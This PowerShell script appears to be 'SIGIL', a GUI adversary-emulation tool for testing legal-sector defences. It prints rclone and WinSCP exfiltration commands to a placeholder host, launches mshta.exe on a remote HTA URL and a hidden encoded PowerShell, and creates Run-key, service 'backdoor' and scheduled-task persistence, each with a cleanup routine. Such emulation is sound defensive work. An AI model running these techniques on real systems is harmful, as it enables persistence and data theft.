<#
SIGIL - Simulation Framework for Legal Sector APT Testing
Enhanced Windows Forms UI with simulation and cleanup actions
Run as Administrator in test environments only.
#>

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# -------------------------------
# Simulation Functions
# -------------------------------
function Simulate-RcloneExfil {
    Write-Host "[SIGIL] (T1041) Simulating Rclone file exfil..."
    # Placeholder: simulate command invocation, write to console
    Write-Host "rclone copy C:\TestFolder remote:s3bucket --sftp-host=example.com"
}
function Cleanup-RcloneExfil {
    Write-Host "[SIGIL] Cleaning up Rclone exfil simulation artifacts..."
    # No persistent artifacts, nothing to clean
}

function Simulate-WinSCPExfil {
    Write-Host "[SIGIL] (T1041) Simulating WinSCP file exfil..."
    Write-Host "winscp.com /command 'open sftp://user@example.com' 'put C:\TestFolder\\*' 'exit'"
}
function Cleanup-WinSCPExfil {
    Write-Host "[SIGIL] Cleaning up WinSCP exfil simulation artifacts..."
    # No persistent artifacts
}

function Simulate-AnyDeskRunKey {
    Write-Host "[SIGIL] (T1547.001) Simulating AnyDesk Run Key persistence..."
    New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SIGIL_AnyDeskSim' -Value 'C:\Program Files\AnyDesk\AnyDesk.exe' -Force | Out-Null
}
function Cleanup-AnyDeskRunKey {
    Write-Host "[SIGIL] Cleaning up AnyDesk Run Key..."
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SIGIL_AnyDeskSim' -ErrorAction SilentlyContinue
}

function Simulate-BrowserLOLBin {
    Write-Host "[SIGIL] (T1218.005) Simulating Browser to mshta.exe..."
    Start-Process -FilePath 'mshta.exe' -ArgumentList 'http://example.com/fake.hta'
}
function Cleanup-BrowserLOLBin {
    Write-Host "[SIGIL] No cleanup required for mshta.exe simulation."
}

function Simulate-WordMacroShell {
    Write-Host "[SIGIL] (T1059.001+T1203) Simulating Word macro → PowerShell..."
    Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -EncodedCommand dGVzdA==' -WindowStyle Hidden
}
function Cleanup-WordMacroShell {
    Write-Host "[SIGIL] No persistent artifacts to clean for macro simulation."
}

function Simulate-ServiceBackdoor {
    Write-Host "[SIGIL] (T1543.003) Simulating Service registry backdoor..."
    New-Item -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\SIGIL_FakeService' -Force | Out-Null
    Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\SIGIL_FakeService' -Name 'ImagePath' -Value 'C:\Tools\backdoor.exe' -Force | Out-Null
}
function Cleanup-ServiceBackdoor {
    Write-Host "[SIGIL] Cleaning up Service registry backdoor..."
    Remove-Item -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\SIGIL_FakeService' -Recurse -ErrorAction SilentlyContinue
}

function Simulate-ScheduledTask {
    Write-Host "[SIGIL] (T1053.005) Simulating Scheduled Task creation..."
    schtasks /create /tn 'SIGIL_LegalTask' /tr 'notepad.exe' /sc onlogon /f | Out-Null
}
function Cleanup-ScheduledTask {
    Write-Host "[SIGIL] Cleaning up Scheduled Task..."
    schtasks /delete /tn 'SIGIL_LegalTask' /f | Out-Null
}

# -------------------------------
# Build UI Form
# -------------------------------
$form = New-Object System.Windows.Forms.Form
$form.Text = 'SIGIL APT Simulation Framework'
$form.Size = New-Object System.Drawing.Size(500,450)
$form.StartPosition = 'CenterScreen'

# Title label
$lblTitle = New-Object System.Windows.Forms.Label
$lblTitle.Text = 'Select Techniques to Simulate / Cleanup'
$lblTitle.Font = New-Object System.Drawing.Font('Segoe UI',14,[System.Drawing.FontStyle]::Bold)
$lblTitle.AutoSize = $true
$lblTitle.Location = New-Object System.Drawing.Point(20,10)
$form.Controls.Add($lblTitle)

# CheckedListBox for techniques
$clb = New-Object System.Windows.Forms.CheckedListBox
$clb.Size = New-Object System.Drawing.Size(450,200)
$clb.Location = New-Object System.Drawing.Point(20,50)
$clb.CheckOnClick = $true

# Add items
$clb.Items.Add('Rclone Exfil (T1041)')         | Out-Null
$clb.Items.Add('WinSCP Exfil (T1041)')         | Out-Null
$clb.Items.Add('AnyDesk Run Key (T1547.001)')   | Out-Null
$clb.Items.Add('Browser → mshta.exe (T1218.005)') | Out-Null
$clb.Items.Add('Word Macro → PowerShell (T1059)')| Out-Null
$clb.Items.Add('Service Backdoor (T1543.003)')  | Out-Null
$clb.Items.Add('Scheduled Task (T1053.005)')   | Out-Null
$form.Controls.Add($clb)

# Run Simulation button
$btnSim = New-Object System.Windows.Forms.Button
$btnSim.Text = 'Run Simulation'
$btnSim.Size = New-Object System.Drawing.Size(120,35)
$btnSim.Location = New-Object System.Drawing.Point(20,270)
$form.Controls.Add($btnSim)
# Run Cleanup button
$btnClean = New-Object System.Windows.Forms.Button
$btnClean.Text = 'Cleanup Actions'
$btnClean.Size = New-Object System.Drawing.Size(120,35)
$btnClean.Location = New-Object System.Drawing.Point(160,270)
$form.Controls.Add($btnClean)

# Status textbox
$tbStatus = New-Object System.Windows.Forms.TextBox
$tbStatus.Multiline = $true
$tbStatus.ReadOnly = $true
$tbStatus.ScrollBars = 'Vertical'
$tbStatus.Size = New-Object System.Drawing.Size(450,80)
$tbStatus.Location = New-Object System.Drawing.Point(20,320)
$form.Controls.Add($tbStatus)

# Function to log to textbox
function Log-ToStatus {
    param($msg)
    $tbStatus.AppendText("[$(Get-Date -Format 'HH:mm:ss')] $msg`r`n")
}

# Button click events
$btnSim.Add_Click({
    if ($clb.CheckedItems.Count -eq 0) {
        [System.Windows.Forms.MessageBox]::Show('Select at least one technique.','No Selection',[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)
        return
    }
    Log-ToStatus '--- Running Simulation ---'
    foreach ($item in $clb.CheckedItems) {
        switch ($item) {
            'Rclone Exfil (T1041)'        { Simulate-RcloneExfil; Log-ToStatus 'Rclone simulation executed.' }
            'WinSCP Exfil (T1041)'        { Simulate-WinSCPExfil; Log-ToStatus 'WinSCP simulation executed.' }
            'AnyDesk Run Key (T1547.001)' { Simulate-AnyDeskRunKey; Log-ToStatus 'Run key created.' }
            'Browser → mshta.exe (T1218.005)' { Simulate-BrowserLOLBin; Log-ToStatus 'mshta launched.' }
            'Word Macro → PowerShell (T1059)' { Simulate-WordMacroShell; Log-ToStatus 'Macro shell spawned.' }
            'Service Backdoor (T1543.003)' { Simulate-ServiceBackdoor; Log-ToStatus 'Service backdoor created.' }
            'Scheduled Task (T1053.005)'  { Simulate-ScheduledTask; Log-ToStatus 'Scheduled task created.' }
        }
    }
    Log-ToStatus '--- Simulation Complete ---'
})

$btnClean.Add_Click({
    if ($clb.CheckedItems.Count -eq 0) {
        [System.Windows.Forms.MessageBox]::Show('Select at least one technique to clean.','No Selection',[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)
        return
    }
    Log-ToStatus '--- Running Cleanup ---'
    foreach ($item in $clb.CheckedItems) {
        switch ($item) {
            'Rclone Exfil (T1041)'        { Cleanup-RcloneExfil; Log-ToStatus 'Rclone cleanup executed.' }
            'WinSCP Exfil (T1041)'        { Cleanup-WinSCPExfil; Log-ToStatus 'WinSCP cleanup executed.' }
            'AnyDesk Run Key (T1547.001)' { Cleanup-AnyDeskRunKey; Log-ToStatus 'Run key removed.' }
            'Browser → mshta.exe (T1218.005)' { Cleanup-BrowserLOLBin; Log-ToStatus 'mshta cleanup done.' }
            'Word Macro → PowerShell (T1059)' { Cleanup-WordMacroShell; Log-ToStatus 'Macro cleanup done.' }
            'Service Backdoor (T1543.003)' { Cleanup-ServiceBackdoor; Log-ToStatus 'Service key removed.' }
            'Scheduled Task (T1053.005)'  { Cleanup-ScheduledTask; Log-ToStatus 'Scheduled task removed.' }
        }
    }
    Log-ToStatus '--- Cleanup Complete ---'
})

# Show UI
[void]$form.ShowDialog()
